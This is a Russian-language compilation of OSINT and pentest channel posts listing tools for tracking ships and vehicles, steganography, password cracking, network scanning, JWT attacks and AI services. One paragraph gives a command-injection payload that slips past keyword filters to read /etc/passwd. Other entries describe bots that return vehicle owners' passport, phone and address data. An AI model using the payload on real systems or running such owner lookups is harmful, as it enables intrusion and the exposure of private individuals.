      <text:p text:style-name="P34">Подборка инструментов для сбора информации о кораблях: https://map.openseamap.org - карта трафика судов, маршрутов, глубин, морской инфраструктуры и т.д; https://www.vesselfinder.com - карта судов (AIS) в реальном времени; https://www.marinetraffic.com - карта судов (AIS) и маршрутов в реальном времени; https://seatracker.ru/ais.php - карта судов (AIS) в реальном времени; https://crewell.net - вакансии на судах, инфо о моряках и компаниях; https://www.shipspotting.com - поиск по каталогу фотографий кораблей; https://www.track-trace.com/container - отслеживание контейнера по номеру; https://www.searates.com/container/tracking/ - отслеживание контейнера по номеру;</text:p>
      <text:p text:style-name="P34">https://www.cma-cgm.com/ebusiness/schedules/voyage - поиск информации о рейсе по номеру или судну; https://theshippingdatabase.com - база данных судоходства; https://www.submarinecablemap.com - карта подводных кабелей связи; https://www.marinevesseltraffic.com/submarine-vessels-tracking-map - карта подводных лодок</text:p>
      <text:p text:style-name="P7">https://www.smappen.com/ - показывает как далеко мог переместиться объект из заданной точки за определенное время. Критерием может выступать время, расстояние или территория; Есть три варианта перемещения объекта: пешком, на велосипеде или автомобиле; Есть платная версия с расширенным функционалом</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T3">Пробиваем автомобиль и его владельца:</text:span></text:p>
      <text:p text:style-name="P2">1. @AV100RUbot - сервис, который не нуждается в представлении. Платный, но стоит своих денег, выдает комплексную информацию по ТС и владельце, имеет свое приложение, сайт и т.д. </text:p>
      <text:p text:style-name="P2">2. vin01.ru - найдет VIN и по нему покажет историю регистраций, историю ДТП, пробег, ОСАГО и многое другое;</text:p>
      <text:p text:style-name="P2">3. vinformer.su - проверка ПТС, поиск по VIN;</text:p>
      <text:p text:style-name="P2">4. nomerogram.ru - найдет фото автомобиля, поиск по гос. номеру:</text:p>
      <text:p text:style-name="P2">5. @Qu1ck_os11nt_bot - выдает данные владельца, ФИО, дату рождения, паспорт, номер телефона, адреса, объявления и парковки;</text:p>
      <text:p text:style-name="P2">6. checkvehicle.sfri.ru - сервис проверки управляемых инвалидом авто или используемых для перевозки инвалида;</text:p>
      <text:p text:style-name="P7">7. @clerksecretbot - находит ФИО, VIN, CNC, марку, ОСАГО</text:p>
      <text:p text:style-name="P2">Прячем файлы в картинках. Часть 1. Представляю подборку из семи Windows утилит для стеганографии:</text:p>
      <text:p text:style-name="P2">1. Anubis (https://sourceforge.net/projects/anubisstegano/files/latest/download) - классика, первая и, к сожалению, последняя версия была написана в 2014 году на Java, поэтому она требует установки JRE, а также (в случае с Windows 10) виртуальной машины DOS - NTVDM. Способна скрывать только текстовые файлы. </text:p>
      <text:p text:style-name="P2">2. DeEgger Embedder (http://www.softpedia.com/get/Security/Encrypting/DeEgger-Embedder.shtml#download) - маленькая утилита, в которой реализован уже больший набор функций, но его использование требует установки .NET Framework 3.5. Помимо BMP, программа поддерживает в качестве контейнеров PNG, JPG, видеофайлы AVI и музыкальные MP3.</text:p>
      <text:p text:style-name="P2">3. DeepSound (http://jpinsoft.net/DeepSound/Overview.aspx) - последняя версия этой программы вышла в ноябре 2015 года. В отличие от остальных, она прячет данные внутри звуковых файлов. В качестве контейнеров DeepSound может использовать WAV (только несжатый, PCM), а также MP3, CDA, WMA, APE и FLAC. DeepSound умеет внедрять файлы любого типа и автоматически рассчитывает доступное для них место в зависимости от размера контейнера и настроек качества аудио.</text:p>
      <text:p text:style-name="P37"><text:soft-page-break/><text:span text:style-name="T3">4. Hallucinate (http://sourceforge.net/projects/hallucinate/) - эта компактная (всего 34 Кбайт) утилита написана на Java и не требует установки. В качестве контейнера она поддерживает форматы BMP и PNG, что делает ее гораздо удобнее Anubis.</text:span></text:p>
      <text:p text:style-name="P34">5. JHide (https://sourceforge.net/projects/jhideapp/) - еще одна компактная утилита, которая, в отличие от Hallucinate, помимо BMP и PNG, поддерживает TIFF, а также позволяет использовать защиту паролем.</text:p>
      <text:p text:style-name="P2">6. OpenPuff (http://download.cnet.com/windows/openpuff-team/3260-20_4-10146585-1.html) - последняя версия (4.00) поддерживает не только сокрытие одних файлов внутри других, но и работу со стегометками произвольного формата. Ей даже можно выделить несколько процессорных ядер, если предстоит большой объем работы. В отличие от других утилит, поддерживающих парольную защиту скрываемого сообщения, OpenPuff умеет использовать для шифрования криптографически стойкий генератор псевдослучайных чисел.</text:p>
      <text:p text:style-name="P7">7. OpenStego (http://www.openstego.com/) - последняя версия OpenStego (0.61) вышла в 2014 году. Программа работает в Windows и Linux. Она поддерживает BMP, PNG, JPG, GIF и WBMP. Заполненный контейнер всегда сохраняется в формате PNG.</text:p>
      <text:p text:style-name="P7">Полезные инструменты для сбора информации об автотранспорте: http://www.worldlicenseplates.com - образцы автомобильных номеров по странам; https://cipher387.github.io/venicle_number_search_toolbox/ - поиск авто по номеру (14 стран); https://www.autocheck.com/vehiclehistory/autocheck-score - поиск по VIN; https://driving-tests.org/vin-decoder/ - расшифровка VIN; https://www.nomerogram.ru - поиск авто по номеру (РФ); https://mobility.portal.geops.io - онлайн-карта общественного транспорта; https://www.waze.com/en-GB/live-map - онлайн карта с отметками о происшествиях на дороге (пробки, дорожные работы, полиция и т. д.).</text:p>
      <text:p text:style-name="P2">8 полезных инструментов, которые широко используются пентестерами по всему миру, помогают находить бреши в безопасности и своевременно их устранять:</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T3">1. John the Ripper (https://github.com/openwall/john) - инструмент, который используется для аудита паролей. Данный инструмент хорошо зарекомендовал себя в сфере пентеста. Программа поддерживает сразу несколько вариантов атак: перебором по словарю; полным перебором (брутфорс); гибридным способом.</text:span></text:p>
      <text:p text:style-name="P2">2. THC-Hydra (https://github.com/vanhauser-thc/thc-hydra) - Простой в использовании многофункциональный брутфорс паролей, который завоевал популярность среди пентестеров по всему миру. Hydra поддерживает большое количество служб, отличается высокой скоростью работы, надёжностью и открытым исходным кодом.</text:p>
      <text:p text:style-name="P2">3. RainbowCrack (https://github.com/inAudible-NG/RainbowCrack-NG) - Популярный взломщик хешей, который характеризуется высокой скоростью работы. Отличается от многих брутфорсов способом взлома: вместо грубого перебора комбинаций с вычислением и сравнением хеша с искомым значением, RainbowCrack сравнивает хеш со значениями из предкалькулированной таблицы. То есть время тратится только на сравнение, что способствует быстрому получению результата.</text:p>
      <text:p text:style-name="P2">4. Nmap (https://github.com/nmap/nmap) - утилита для сканирования и аудита безопасности сетей. Инструмент широко используется для сканирования узлов, получения списка открытых портов, сканирования запущенных сервисов и идентификации хостов в сети.</text:p>
      <text:p text:style-name="P2">5. ZMap (https://github.com/zmap/zmap) - инструмент изначально создавался как более быстрая альтернатива Nmap для сканирования всей сети, а не отдельных фрагментов. Чтобы добиться скорости в 1,4 млн пакетов в секунду, достаточно обычного компьютера с гигабитным соединением. (высокая нагрузка, которая способна вывести из строя сетевое оборудование, аккуратней)</text:p>
      <text:p text:style-name="P2">6. Masscan (https://github.com/robertdavidgraham/masscan) - Ещё один массовый асинхронный сканер, который работает со скоростью до 25 млн пакетов в секунду. Полезен для сканирования огромных сетей, таких как Интернет.</text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T3">7. tcpdump (https://github.com/the-tcpdump-group/tcpdump) - сниффер с интерфейсом командной строки, с которым можно посмотреть, какие пакеты проходят через сетевую карту в данный момент. Чаще всего используется для </text:span><text:soft-page-break/><text:span text:style-name="T3">отладки сети и в учебных целях, но возможности утилиты также позволяют проводить сетевые атаки и выявлять сканирование хоста.</text:span></text:p>
      <text:p text:style-name="P20"><text:span text:style-name="T3">8. mitmproxy (https://github.com/mitmproxy/mitmproxy) - утилита для отладки, тестирования, оценки уровня конфиденциальности и тестирования на проникновение. С mitmproxy можно перехватывать, проверять, изменять и воспроизводить поток HTTP-трафика. Благодаря такой функциональности утилита широко используется не только хакерами и пентестерами, но также разработчиками веб-приложений для их своевременной отладки.</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P2">Прячем файлы в картинках. Часть 2:</text:p>
      <text:p text:style-name="P2">1. Cloakify (https://github.com/TryCatchHCF/Cloakify) - ;это боль­шая и лег­ко рас­ширя­емая прог­рамма, которая исполь­зует скрип­ты Cloakify Toolset. Осо­бен­ность ее в том, что перед мас­киров­кой наг­рузки она кодиру­ется в Base64.</text:p>
      <text:p text:style-name="P34">2. Steghide;(https://github.com/StefanoDeVuono/steghide) - кон­соль­ная ути­лита, написан­ная на C++. Скры­вает информа­цию в стан­дар­тных фай­лах фор­матов JPEG, BMP, WAV и AU. В арсе­нале прог­раммы пол­но шиф­ров - даже Blowfish, которо­го я у дру­гих не замечал.</text:p>
      <text:p text:style-name="P34">3. Spectrology (https://github.com/solusipse/spectrology) - поз­воля­ет прев­ращать изоб­ражения в ауди­одо­рож­ки с «заряжен­ными» спек­трог­рамма­ми, из которых потом мож­но дос­тать кар­тинки.</text:p>
      <text:p text:style-name="P2">4. ImageSpyer G2;(https://freesoft.net/windows/imagespyer_g2)—;пря­чет сек­ретные фай­лы толь­ко в кар­тинки и даже раз­реша­ет ста­вить пароль, что­бы зашиф­ровать дан­ные перед внед­рени­ем. Прог­рамма под­держи­вает око­ло 30 алго­рит­мов шиф­рования внед­ряемой информа­ции и 25 хеш‑фун­кций для под­писи, что­бы убе­дить­ся, что встро­енный в кар­тинку файл не побил­ся при переда­че. Старая программа без официального сайта. Написана Алек­сан­дром Мясниковым. </text:p>
      <text:p text:style-name="P2">5. RedJPEG (https://freesoft.ru/windows/redjpeg_xt) - еще один сте­гозавр авторс­тва Алек­сан­дра Мяс­никова. На этот раз - с собс­твен­ным алго­рит­мом внед­рения изоб­ражения в кар­тинки, сжа­тием LZMA и офор­мле­нием для нос­таль­гиру­ющих по СССР.</text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T3">6. OpenStego (https://github.com/syvaidya/openstego/releases) - софт реали­зован на Java, име­ет под­дер­жку шиф­рования AES и край­не популя­рен сре­ди жела­ющих поз­накомить­ся со сте­ганог­рафи­ей. Под­держи­вает пла­гины, что­бы ты </text:span><text:soft-page-break/><text:span text:style-name="T3">сам смог реали­зовать какой‑нибудь сте­ганог­рафичес­кий алго­ритм. Есть вер­сии и для Windows, и для Linux.</text:span></text:p>
      <text:p text:style-name="P2">7. SilentEye (https://achorein.github.io/silenteye/) - кросс‑плат­формен­ный софт с прос­тым интерфей­сом. Обла­дает мно­жес­твом пла­гинов и при­ятным GUI. Исполь­зует сов­ремен­ные алго­рит­мы сте­ганог­рафии и мас­киров­ки.</text:p>
      <text:p text:style-name="P7">8. ImageJS;(https://github.com/jklmnn/imagejs) - поз­воля­ет соз­дать кар­тинки, которые одновре­мен­но пред­став­ляют собой нас­тоящие JS-скрип­ты. Это нуж­но, что­бы упростить про­веде­ние более опас­ных XSS-атак, в которых иног­да тре­бует­ся под­гру­зить скрипт имен­но с ата­кован­ного домена.</text:p>
      <text:p text:style-name="P7">Kerberos: руководство для пентестеров. Kerberos - это протокол, который проверяет удостоверения пользователей или узлов с помощью системы цифровых «билетов». Он позволяет доверенным узлам обмениваться данными через ненадежные сети, в частности через Интернет, без передачи или хранения паролей в виде простого текста. В этом цикле статей автор разберёт, как устроен протокол Kerberos и какие атаки с его использованием можно осуществить на практике в AD. Также будут приведены некоторые рекомендации по противодействию рассматриваемым атакам: Часть 1. Теория - https://ardent101.github.io/posts/kerberos_theory/; Часть 2. Классические атаки - https://ardent101.github.io/posts/kerberos_general_attacks/; Часть 3. Неограниченное делегирование - https://ardent101.github.io/posts/kerberos_delegation/; Часть 4. Ограниченное делегирование <text:s/>- https://ardent101.github.io/posts/kerberos_constrained/; Часть 5. Делегирование, ограниченное на основе ресурсов - https://ardent101.github.io/posts/kerberos_rbcd/; Часть 6. PKINIT - https://ardent101.github.io/posts/shadow_creds/</text:p>
      <text:p text:style-name="P2">Используем блага нейросетей. Часть 16:</text:p>
      <text:p text:style-name="P2">1. Captions (https://www.captions.ai/) - направляет ваши глаза на камеру при видео созвоне, даже если вы смотрите в сторону. Весьма пригодится студентам на дистанционном обучении;</text:p>
      <text:p text:style-name="P34">2. Luma (https://lumalabs.ai/interactive-scenes) - может делать 3D модели из обычных снимков. С ними можно делать что угодно, хоть загрузить в проект игры;</text:p>
      <text:p text:style-name="P37"><text:soft-page-break/><text:span text:style-name="T3">3. 3D Gaussian Splatting (https://poly.cam/gaussian-splatting) <text:s/>- сделает 3D модель из пары десятков фото. Можно загружать до 200 фотографий;</text:span></text:p>
      <text:p text:style-name="P2">4. <text:s/>AI-Translator (https://ai-code-translator.vercel.app/) - переводит один язык программирования в другой. Бесплатный;</text:p>
      <text:p text:style-name="P2">5. Stylize (https://www.usestylize.com/) - сервис, где можно изменить стиль изображения: киберпанк, анимированный вариант и имитация рисунка;</text:p>
      <text:p text:style-name="P2">6. AudioSR (https://github.com/haoheliu/versatile_audio_super_resolution) - прокачает качество аудиотрека до Hi-Fi звучания;</text:p>
      <text:p text:style-name="P2">7. Portfolio Magic (https://contra.com/portfolios) - составляет портфолио из предоставленных вами данных;</text:p>
      <text:p text:style-name="P7">8. Swapmyface (https://swapmyface.app/me) - сделает дипфейк из двух фото всего в два клика.</text:p>
      <text:p text:style-name="P2">Макро-OSINT. Часть 2. Занимаемся глобальной разведкой:</text:p>
      <text:p text:style-name="P2">1. SunCalc (http://www.suncalc.org/) - показывает траекторию движения солнца и фазы солнечного света в течение определенного дня в определенном месте. Помогает вычислить по теням местоположение;</text:p>
      <text:p text:style-name="P2">2. Orbitrack (https://www.orbtrack.org/) - позволяет отслеживать спутники в реальном времени;</text:p>
      <text:p text:style-name="P2">3. Sharaku (https://sharaku.eorc.jaxa.jp/GSMaP/index.htm) - показывает данные о погодных условиях в реальном времени со всего мира;</text:p>
      <text:p text:style-name="P2">4. Maxar Discover (https://t.me/osint_club_channel/986) - позволяет выбрать область на карте и выбрать из списка возможных фотографий со спутника;</text:p>
      <text:p text:style-name="P2">5. NewspaperMap (https://newspapermap.com/) - предоставляет интерактивную карту онлайн газет со всего мира, включая региональные:</text:p>
      <text:p text:style-name="P2">6. Geohints (https://geohints.com/) - крупнейший архив предметов и особенностей разных стран, которые чаще всего можно встретить на фотографиях;</text:p>
      <text:p text:style-name="P2">7. Freedar (https://radar.freedar.uk/VirtualRadar/desktop.html) - трекинг военных и частных самолётов;</text:p>
      <text:p text:style-name="P7">8. Pl@ntNet (https://identify.plantnet.org/uk) - это инструмент, который поможет идентифицировать растение по картинке и покажет, в каких частях земного шара оно распространено.</text:p>
      <text:p text:style-name="P38"><text:soft-page-break/><text:span text:style-name="T3">Онлайн инструменты для редактирования фотографий: https://cleanup.pictures - удалит объекты с фото; https://theinpaint.com - удалит объекты с фото (есть приложение); https://snapedit.app - удалит объекты, фон или восстановит старые фото; https://github.com/upscayl/upscayl - умеет увеличивать и улучшать изображения с низким разрешением; https://app.remini.ai - улучшает качество фото/видео; https://imagecolorizer.com - раскрашивает чёрно-белые фото, улучшает качество, восстанавливает повреждённые участки; https://letsenhance.io - улучшит качество и детализацию, удалит фон, восстановит размытые участки; <text:s/>https://hotpot.ai - набор ИИ для работы с изображениями (генераторы, колоризаторы, реставраторы и т.д.); https://www.remove.bg - удалит фон; https://removal.ai - удалит фон; https://www.iloveimg.com - сжатие, изменение размера, обрезание, редактор, добавление водяных знаков/текста, размытие, конвертер</text:span></text:p>
      <text:p text:style-name="P38"><text:span text:style-name="T6">Продолжаем теоретические рассуждения об осинте. И сегодня опять про анализ. В прошлом посте (https://t.me/Pulsechanel/435) по этой теме я упоминал проблему обработки большого объёма информации. И, кстати, по моим наблюдениям, чаще это проблема не новичков, а тех кто уже что-то шарит. Возможно потому что новички не переоценивают свои навыки и достаточно скрупулёзно относятся к тому что делают, а те кто шарят, думают что смогут удержать в голове всю картину изучаемой ситуации и в итоге пропускают какие-то детали. И иногда бывает так, что эти детали достаточно важны. Что делать? То что всё найденное нужно записывать и сохранять, слишком очевидно, что бы на этом лишний раз останавливаться. Но может получится так, что ты насохраняешь столько, что потом будет довольно трудно обработать весь этот объём. Особенно если ты заранее не продумал структуру своих записей. Это и есть первый совет. Начиная собирать информацию, сразу определись как ты будешь делать заметки и сохранять информацию. Это должно быть организовано так, что бы было удобно именно тебе и что бы ты всегда понимал где лежит какая-то информация. Следующий важный момент это визуализация. Это слишком крутой способ анализа чтобы им пренебрегать. В частности отлично работают схемы связей, особенно при обработке больших объёмов информации. Под схемой связей обычно подразумевают связи между людьми. Например, кто с кем знаком или общается, или родственники, или ещё </text:span><text:soft-page-break/><text:span text:style-name="T6">что-то. Также схемы связей стоит использовать при изучении организаций. Причём не только для изучения связанных и аффилированных лиц, но и для, например, визуализации перечисления денег. Схемы связей можно использовать не только для визуализации связей объектов, но и событий. Например, для построения хронологии связанных (и не очень) событий. Особенно если этих событий много, либо это что-то длительное по времени. В такой ситуации это поможет наглядно увидеть что за чем шло, и возможно лучше понять причины и следствия, а также увидеть "пробелы" в изучаемой истории. Как и где рисовать схему, это вопрос очень индивидуальный, тут самое главное чтоб тебе было удобно и понятно. Можно использовать Maltego или другой софт. Если хочется онлайн то, лично мне удобен https://app.diagrams.net. Я, например, использую софт только тогда когда эту схему надо потом кому-то показывать, во всех остальных случаях рисую просто на обычном листе в процессе сбора информации. Мне так быстрее, удобнее и всегда перед глазами. Можно конечно нарисованную от руки показывать, но это нужно уметь красиво рисовать и разборчиво писать, ни то ни другое вообще не про меня, потому приходится перерисовывать в редакторе. Короче как удобно так и делай, хоть, как в фильмах про детективов, ниточки на доске растягивай, главное чтоб потом сам в этом разобрался.</text:span></text:p>
      <text:p text:style-name="P39">Используем блага нейросетей. Часть 17:</text:p>
      <text:p text:style-name="P39">1. Photofairy (http://photofairy.ai/) - еще одна онлайн версия фотошопа, но с интегрированным ИИ от Canva. Бесплатный.</text:p>
      <text:p text:style-name="P39">2. Google Labs <text:s/>(https://labs.google/) - умный помощник в Google таблицах. Дает подсказки, определяет взаимосвязь столбцов таблицы и так далее.</text:p>
      <text:p text:style-name="P39">3. LLEMMA (https://github.com/EleutherAI/math-lm) - решает математические задачи любого уровня, от элементарной до высшей математики. </text:p>
      <text:p text:style-name="P39">4. MagicSlides <text:s/>(https://www.magicslides.app/tools/youtube-to-ppt) - конвертирует видео с YouTube в презентацию. Работает прямо в браузере. 3 бесплатных генерации в месяц.</text:p>
      <text:p text:style-name="P39">5. DA-CLIP (https://huggingface.co/spaces/fffiloni/DA-CLIP) - восстановит качество вашей фотографии, а именно, может убрать размытый фокус, капли дождя, туман и другие искажения.</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T6">6. ReTalking (https://github.com/OpenTalker/video-retalking) - озвучивает видео согласно загруженной <text:s/>аудиодорожке, синхронизирует движение губ согласно тексту;</text:span></text:p>
      <text:p text:style-name="P40">7. Moonvalley (https://moonvalley.ai/) - генерирует видео, в Discord, чем напоминает MidJourney</text:p>
      <text:p text:style-name="P39">Нетсталкинг. Часть 1:</text:p>
      <text:p text:style-name="P39">1. Ultimate Netstalking Guide (https://github.com/pantyusha/ultimate-netstalking-guide/) - то, с чего стоит начать свой путь. </text:p>
      <text:p text:style-name="P39">2. Хидден-пак (https://disk.yandex.ru/d/R0VdqI_93JyssH) - весь необходимый софт, собран и применяется группой H.I.D.D.E.N - набор инструкций и ссылок для начинающих от них же.</text:p>
      <text:p text:style-name="P39">3. Awesome Randomizers (https://github.com/netstalking-core/awesome-randomizers) - подборка всевозможных рандомайзеров.</text:p>
      <text:p text:style-name="P39">4. Точка Входа (https://t.me/netstalkpoint) - вход в Точку Сбора, центральную конференцию по нетсталкингу.</text:p>
      <text:p text:style-name="P39">5. /home/user/netstalking/documents (https://t.me/netstalking_documents) - книги и гайды по теме нетсталкинга и не только;</text:p>
      <text:p text:style-name="P41">Нетсталкинг. Часть 2:</text:p>
      <text:p text:style-name="P39">1. Catan the Netstalker (https://www.youtube.com/channel/UC9eTurqhX6ZfKp85lfd42_g/videos) - видосы для начинающих о нетсталкинге и использовании софта в нём.</text:p>
      <text:p text:style-name="P39">2. pereval-team <text:s/>(https://github.com/pereval-team) - проект "Перевал", сборка серверного софта для собственного нетсталкерского сервера.</text:p>
      <text:p text:style-name="P39">3. 49406-форум <text:s/>(https://forum.netstalking.ru/) - нетсталкерский форум по всем направлениям.</text:p>
      <text:p text:style-name="P40">4. Архив DarkNet сайтов (https://t.me/DarkGodnota) - заброшенный архив сайтов от Горизонта Событий.</text:p>
      <text:p text:style-name="P40">Command Injection с обходом блокировки ключевых слов. Атаки подобного вида осуществляются через формы ввода данных, cookie файлы, заголовки HTTP с последующим внедрением в системную оболочку. Это становится возможным, когда отсутствует контроль вводимых данных или он носит поверхностный характер. Если вы нашли Command Injection, а WAF блокирует ключевые слова, то можно попробовать один из способов обхода, заключающийся в добавлении обратного слеша и символа новой строки между словами из черного списка: c\%0aat /et\%0ac/pas\%0aswd</text:p>
      <text:p text:style-name="P39">Используем блага нейросетей. Часть 18:</text:p>
      <text:p text:style-name="P39">1. Blazing Fast (https://wonderslide.com/) - сделает .pptx презентацию под ваш запрос за несколько минут;</text:p>
      <text:p text:style-name="P39">2. Ideogram (https://ideogram.ai/login) - генерирует картинки без сложных промтов, бесплатная;</text:p>
      <text:p text:style-name="P39">3. patterns (https://www.designpatterns.io/ai) - создаст любой веб-дизайн по простому текстовому запросу;</text:p>
      <text:p text:style-name="P39">4. gling (https://www.gling.ai/) - удаляет слова-паразиты, паузы и случайные звуки из видеороликов;</text:p>
      <text:p text:style-name="P39">5. Merlin (https://merlin.foyer.work/) - расширение для браузера, запускает GPT на любой странице;</text:p>
      <text:p text:style-name="P39">6. AnimateDiff (https://animatediff.github.io/) - он добавляет к картинке движение и прочие детали.</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T6">7. ProductAI (https://www.productai.photo/) - AI-сервис для генерации ярких и запоминающихся фото товаров;</text:span></text:p>
      <text:p text:style-name="P40">8. Pros 'n Cons (https://pros-cons.io/) - распишет плюсы и минусы при принятии решений.</text:p>
      <text:p text:style-name="P39">Инструменты захвата и анализа пакетов. Захват и анализ пакетов чрезвычайно полезны для изучения сетевых взаимодействий и выявления неэффективных передач, а также опасных киберугроз:</text:p>
      <text:p text:style-name="P39">1. tcpflow (https://github.com/simsong/tcpflow) - это программа, которая захватывает данные, передаваемые в рамках TCP-соединений (потоков), и сохраняет данные в виде, удобном для анализа и отладки протокола.</text:p>
      <text:p text:style-name="P39">2. OpenFPC (https://github.com/leonward/OpenFPC) - это набор инструментов, которые в совокупности обеспечивают облегченную полнофункциональную систему записи сетевого трафика и буферизации. Цель его разработки - позволить пользователям, не являющимся экспертами, развертывать распределенный регистратор сетевого трафика на оборудовании COTS, одновременно интегрируя его в существующие средства управления предупреждениями и журналами.</text:p>
      <text:p text:style-name="P39">3. Dshell (https://github.com/USArmyResearchLab/Dshell) - это фреймворк для судебного анализа сети. Обеспечивает быструю разработку подключаемых модулей для поддержки разбора перехваченных сетевых пакетов.</text:p>
      <text:p text:style-name="P39">4. stenographer (https://github.com/google/stenographer) - решение для захвата пакетов, предназначенное для быстрой буферизации всех пакетов на диск, а затем для обеспечения простого и быстрого доступа к подмножествам этих пакетов.</text:p>
      <text:p text:style-name="P20"><text:span text:style-name="T6">5. Moloch (https://github.com/atimorin/moloch) - это крупномасштабная система захвата пакетов IPv4 (PCAP), индексации и базы данных с открытым исходным кодом. Для просмотра, поиска и экспорта PCAP предусмотрен простой веб-интерфейс. Доступны API-интерфейсы, которые позволяют напрямую загружать данные PCAP и данные сеанса в формате JSON.</text:span><text:span text:style-name="T6"/></text:p>
      <text:p text:style-name="P39">Используем блага нейросетей. Часть 19:</text:p>
      <text:p text:style-name="P39">1. draw-a-ui (https://github.com/SawyerHood/draw-a-ui) - сделает вам сайт из простого эскиза;</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T6">2. Upscayl (https://www.upscayl.org/) - улучшит качество ваших фото, бесплатно;</text:span></text:p>
      <text:p text:style-name="P39">3. Picsart (https://picsart.com/ru/create) - хороший графический редактор в браузере;</text:p>
      <text:p text:style-name="P39">4. Falcon (https://huggingface.co/spaces/tiiuae/falcon-180b-demo) - очередной убийца Chat-GPT, подающий надежды;</text:p>
      <text:p text:style-name="P39">5. Polycam (https://poly.cam/tools/photogrammetry) - инструмент для 3D сканирования;</text:p>
      <text:p text:style-name="P39">6. HuggingFace (https://huggingface.co/spaces/latent-consistency/super-fast-lcm-lora-sd1.5) - генерирует картинку еще до того, как вы дописали промт;</text:p>
      <text:p text:style-name="P39">7. Krea AI (https://www.krea.ai/) - еще один хайповый генератор картинок</text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T7"><text:span text:style-name="T6"/></text:p>
      <text:p text:style-name="P39">JSON Web Token - это JSON объект, который определен в открытом стандарте RFC 7519.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 Инструменты для автоматизации JWT-атаки:</text:p>
      <text:p text:style-name="P39">1. jwtXploiter (https://github.com/DontPanicO/jwtXploiter) - это Python-инструмент, предназначенный для автоматизации взлома JWT. Он позволяет проверить соответствие всех известных CVE для JWT и поддерживает различные виды атак на JWT, начиная от простого взлома и до выполнения атак с использованием самозаверяющих токенов!</text:p>
      <text:p text:style-name="P39">2. JSON Web Tokens (https://portswigger.net/bappstore/f923cbf91698420890354c1d8958fee6) - это дополнение для Burpsuite, которое автоматизирует распространенные атаки на JWT. Кроме того, оно позволяет быстро выполнять кодирование / декодирование и проверку токенов.</text:p>
      <text:p text:style-name="P39">3. JWT Tool <text:s/>(https://github.com/ticarpi/jwt_tool)- (https://github.com/ticarpi/jwt_tool) это широко используемый инструмент на языке Python, который позволяет производить проверку всех возможных атак, которые могут уязвимо существовать в веб-приложении.</text:p>
      <text:p text:style-name="P20"><text:span text:style-name="T6">4. JWT Editor (https://portswigger.net/bappstore/26aaa5ded2f74beea19e2ed8345a93dd) - это </text:span><text:soft-page-break/><text:span text:style-name="T6">дополнение для Burpsuite, которое обеспечивает возможность удобно изменять JWT-токены и быстро проверять различные методы обхода.</text:span></text:p>
      <text:p text:style-name="P39">Используем блага нейросетей. Часть 20:</text:p>
      <text:p text:style-name="P39">1. Simple Video Tools (https://videobolt.net/browse-all-simple-video-tools) - неплохой онлайн-видеоредактор;</text:p>
      <text:p text:style-name="P39">2. Predis AI (https://predis.ai/free-ai-tools/ai-meme-generator) - генератор мемов;</text:p>
      <text:p text:style-name="P39">3. Kapwing (https://www.kapwing.com/) - простой видеоредактор в браузере;</text:p>
      <text:p text:style-name="P39">4. GetHeadShots (https://www.getheadshots.ai/) - делает хороший портрет из любого фото;</text:p>
      <text:p text:style-name="P39">5. The Daily Dad Joke (https://dailydadjoke.app/) - генератор кринжовых шуток;</text:p>
      <text:p text:style-name="P39">6. Smry (https://www.smry.ai/) - cнимает пэйволл и пересказывает статьи;</text:p>
      <text:p text:style-name="P39">7. Versatile Audio Resolution (https://github.com/haoheliu/versatile_audio_super_resolution) - повышает качество аудиофайла;</text:p>
      <text:p text:style-name="P42">8. HuggingFace (https://huggingface.co/ostris/ikea-instructions-lora-sdxl) - генерирует инструкции в стиле IKEA для всего;</text:p>
      <text:p text:style-name="P42">9. OSA by Loopsie (https://apps.apple.com/us/app/loopsie-ai-art-generator/id1259909228) - перерисовывает фото в аниме стиль;</text:p>
      <text:p text:style-name="P40">10. MatchColors (https://apps.apple.com/us/app/matchcolors-ai/id1452475491) - копирует обработку другого фото</text:p>
      <text:p text:style-name="P39">ТОП-5 расширений для OSINT-расследований. В этом посте представим вам 10 расширений для браузера, которые упростят и ускорят рутинную часть, на которую порой уходит уж слишком много времени.</text:p>
      <text:p text:style-name="P39">1. Shodan (https://chromewebstore.google.com/detail/shodan/jjalcfnidlmpjhdfepjhjbhnhkbgleap): Расширение, которое покажет где размещён веб-сайт (страна, город), кому принадлежит IP-адрес и какие порты открыты.</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T6">2. Sputnik (https://chromewebstore.google.com/detail/sputnik/manapjdamopgbpimgojkccikaabhmocd): Расширение для быстрого и легкого поиска IP-адресов, доменов, хэшей файлов и URL-адресов.</text:span></text:p>
      <text:p text:style-name="P39">3. Search by Image (https://chromewebstore.google.com/detail/search-by-image/cnojnbdhbhnkbcieeekonklommdnndci): Инструмент обратного поиска изображений с поддержкой различных поисковых систем, таких как Google, Bing, Yandex, Baidu и TinEye.</text:p>
      <text:p text:style-name="P39">4. Wayback Machine (https://chromewebstore.google.com/detail/fpnmgdkabkmnadcjpehmlllkndpkmiak?hl=ru): Это широко известный и полезный сервис, позволяющий увидеть сайты в том виде, в котором они существовали в прошлом.</text:p>
      <text:p text:style-name="P40">5. Epieos (https://epieos.com/): Инструмент, который позволяет выполнять обратный поиск по электронной почте, находить похожие в Google и видеть, какие веб-сайты связаны с каким-либо адресом электронной почты.</text:p>
      <text:p text:style-name="P39">Burp Suite: полезные расширения для пентеста. Burp Suite – это платформа для проведения аудита безопасности веб-приложений. Содержит инструменты для составления карты веб-приложения, поиска файлов и папок, модификации запросов, фаззинга, подбора паролей и др. Кроме того, существует магазин дополнений BApp store, содержащий расширения, улучшающие функционал бурпа. В этом посте подобрали пять таких, повышающие эффективность Burp Suite при пентесте веб-приложений.</text:p>
      <text:p text:style-name="P39">1. Software Vulnerability Scanner (https://portswigger.net/bappstore/c9fb79369b56407792a7104e3c4352fb) - Это расширение показывает публичные уязвимости для приложений, обнаруженные в трафике, который проксирует Burp. Представляет собой, по сути, прослойку между Burp и API этого отличного агрегатора уязвимостей.</text:p>
      <text:p text:style-name="P39">2. Backslash Powered Scanner (https://portswigger.net/bappstore/9cff8c55432a45808432e26dbb2b41d8) - Дополняет активный сканер Burp, используя новый подход, способный находить и подтверждать как известные, так и неизвестные классы уязвимостей для внедрения на стороне сервера.</text:p>
